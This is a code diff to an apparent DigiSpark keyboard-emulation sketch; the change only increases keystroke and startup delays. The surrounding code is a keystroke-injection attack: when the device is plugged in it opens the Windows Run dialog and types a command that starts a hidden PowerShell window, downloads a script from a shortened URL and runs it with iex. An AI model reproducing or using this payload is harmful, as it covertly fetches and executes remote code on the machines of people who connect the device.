@@ -53,7 +53,7 @@ void typeChar(char c) {
   
   if (key != 0) {
     DigiKeyboard.sendKeyStroke(key, mod);
-    DigiKeyboard.delay(30);
+    DigiKeyboard.delay(50);
   }
 }
 
@@ -64,11 +64,11 @@ void typeString(const char* str) {
 }
 
 void setup() {
-  DigiKeyboard.delay(200);
+  DigiKeyboard.delay(500);
   
   // Open Run dialog (Win+R)
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(200);
+  DigiKeyboard.delay(500);
   
   // Type command
   typeString("cmd /c start /min powershell -windowstyle hidden -command iex (wget https://tinyurl.com/y4tvvezc -useb)");
